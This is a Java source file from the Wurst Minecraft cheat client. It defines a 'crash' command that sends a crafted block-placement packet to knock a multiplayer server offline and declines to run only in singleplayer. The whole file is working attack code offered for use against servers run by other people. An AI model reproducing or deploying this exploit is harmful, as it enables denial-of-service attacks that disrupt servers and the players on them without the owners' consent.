/*
 * Copyright © 2014 - 2015 | Alexander01998 | All rights reserved.
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package tk.wurst_client.commands;

import net.minecraft.client.Minecraft;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

@Cmd.Info(help = "Crashes the server.", name = "crash", syntax = {})
public class CrashCmd extends Cmd
{
	@Override
	public void execute(String[] args) throws Error
	{
		if(args.length != 0)
			syntaxError();
		if(Minecraft.getMinecraft().isIntegratedServerRunning()
			&& Minecraft.getMinecraft().thePlayer.sendQueue.getPlayerInfo()
				.size() == 1)
			error("Cannot crash server when in singleplayer.");
		final ItemStack item = new ItemStack(Item.getByNameOrId("1"));
		generatePacket(item);
	}
	
	private void generatePacket(ItemStack item)
	{
		Minecraft.getMinecraft().thePlayer.sendQueue
			.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(0, 0, 0), 0, item, 0, 0, 0));
	}
}
